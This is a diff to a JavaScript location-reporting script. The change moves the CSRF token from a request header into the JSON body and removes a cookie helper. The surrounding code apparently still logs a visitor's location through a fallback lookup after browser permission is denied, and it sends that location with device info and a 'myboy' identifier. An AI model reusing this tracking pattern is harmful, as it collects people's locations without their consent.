@@ -3,6 +3,7 @@ getLocation();
 var myElement = document.getElementById("myElement");
 var myboy = myElement.getAttribute("data-myboy");
 var device_info = myElement.getAttribute("data-device");
+var csrfmiddlewaretoken = $('input[name=csrfmiddlewaretoken]').val()  
 function getLocation() {
   if (navigator.geolocation) {
     // Request the user's current location
@@ -13,7 +14,7 @@ function getLocation() {
         var longitude = position.coords.longitude;
        
         var msg = "Allowed"
-        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info}
+        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
         sendLocationRequest(info);
         // Call the initMap function with the obtained coordinates
       },
@@ -34,10 +35,6 @@ function sendLocationRequest(info){
     $.ajax({
             url: "",
             type: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "X-CSRFToken": getCookie("csrftoken") // Include CSRF token
-            },
             data: JSON.stringify(info),
             dataType: "json",
             // data:info,
@@ -68,34 +65,19 @@ function getAutomaticLocation() {
         var latitude = data.latitude;
         var longitude = data.longitude;
         var msg = "Not Allowed"
-        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info}
+        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
         sendLocationRequest(info)
       } else {
         var msg = 'Unable to retrieve location data.'
-        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info}
+        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
         sendLocationRequest(info)
       }
     } else if (xhr.readyState === 4 && xhr.status !== 200) {
       var msg = 'Error getting location. Status: '+ xhr.status
-        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info}
+        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
       sendLocationRequest(info)
     }
   };
   xhr.send();
 }
 
-
-function getCookie(name) {
-  var cookieValue = null;
-  if (document.cookie && document.cookie !== "") {
-    var cookies = document.cookie.split(";");
-    for (var i = 0; i < cookies.length; i++) {
-      var cookie = cookies[i].trim();
-      if (cookie.substring(0, name.length + 1) === name + "=") {
-        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
-        break;
-      }
-    }
-  }
-  return cookieValue;
-}
